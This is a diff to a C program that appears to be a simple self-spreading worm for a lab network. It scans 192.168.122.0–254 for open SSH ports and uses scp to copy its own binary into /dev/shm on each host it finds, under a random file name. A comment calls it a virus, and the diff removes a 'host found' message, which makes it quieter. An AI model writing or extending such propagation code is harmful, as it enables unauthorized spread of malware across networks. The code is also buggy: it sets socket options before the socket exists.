@@ -12,6 +12,7 @@
 
 #define FILENAME_SIZE 20
 #define BUFFER_SIZE 256
+#define SOCKET_TIMEOUT 1
 
 void generate_random_string(char *str) {
     const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -22,7 +23,7 @@ void generate_random_string(char *str) {
     }
 }
 
-void get_random_seed(char *seed) {
+void generate_random_seed(char *seed) {
     FILE *dev_urandom_fd = fopen("/dev/urandom", "r");
     if(dev_urandom_fd != NULL) {
         *seed = getc(dev_urandom_fd);
@@ -30,17 +31,19 @@ void get_random_seed(char *seed) {
 }
 
 int main(int argc, char **argv) {
-    char baseIP[] = "192.168.122.";
-    char c2IP[] = "192.168.122.1";
-    char cmdBuffer[256];
-    char randNameBuffer[20];
-    int port = 22;
-    int startHost = 0;
-    int endHost = 254;
+    char ip_range[] = "192.168.122.",
+        master_ip[] = "192.168.122.1";
+    char cmd_buffer[BUFFER_SIZE],
+        rnd_name_buffer[FILENAME_SIZE];
+    int port = 22,
+        startHost   = 0,
+        endHost     = 254;
     char seed;
     
-    get_random_seed(&seed);
+    // get main seed from reading 1 byte of urandom
+    generate_random_seed(&seed);
 
+    // start ip range scan
     for (int i = startHost; i <= endHost; i++) {
         pid_t pid = fork();
 
@@ -49,22 +52,23 @@ int main(int argc, char **argv) {
             exit(EXIT_FAILURE);
         }
 
+        // in child process
         if (pid == 0) {
+            // generate prng from child specific seed
             srand(seed ^ (getpid()<<16));
-            // in child process
             int sock;
-            struct sockaddr_in server_addr;
             char targetIP[32];
+            struct sockaddr_in server_addr;
+            struct timeval timeout;
 
             // build target IP
-            snprintf(targetIP, sizeof(targetIP), "%s%d", baseIP, i);
+            snprintf(targetIP, sizeof(targetIP), "%s%d", ip_range, i);
 
-            struct timeval timeout;
-            timeout.tv_sec = 1;
+            // set timeout to close socket after X seconds without response
+            timeout.tv_sec = SOCKET_TIMEOUT;
             timeout.tv_usec = 0;
             setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
             setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
-
 
             // Create the socket
             if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
@@ -72,7 +76,7 @@ int main(int argc, char **argv) {
                 exit(EXIT_FAILURE);
             }
 
-            // Build server_addr struct
+            // build server_addr struct
             memset(&server_addr, 0, sizeof(server_addr));
             server_addr.sin_family = AF_INET;
             server_addr.sin_port   = htons(port);
@@ -84,11 +88,10 @@ int main(int argc, char **argv) {
 
             // try socket connection
             if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
-                printf("Host %s with port %d found\n", targetIP, port);
                 // copy virus in tempfs
-                generate_random_string(randNameBuffer);
-                snprintf(cmdBuffer, sizeof(cmdBuffer), "scp %s debian@%s:/dev/shm/%s", argv[0], targetIP, randNameBuffer);
-                system(cmdBuffer);
+                generate_random_string(rnd_name_buffer);
+                snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:/dev/shm/%s", argv[0], targetIP, rnd_name_buffer);
+                system(cmd_buffer);
             }
 
             close(sock);
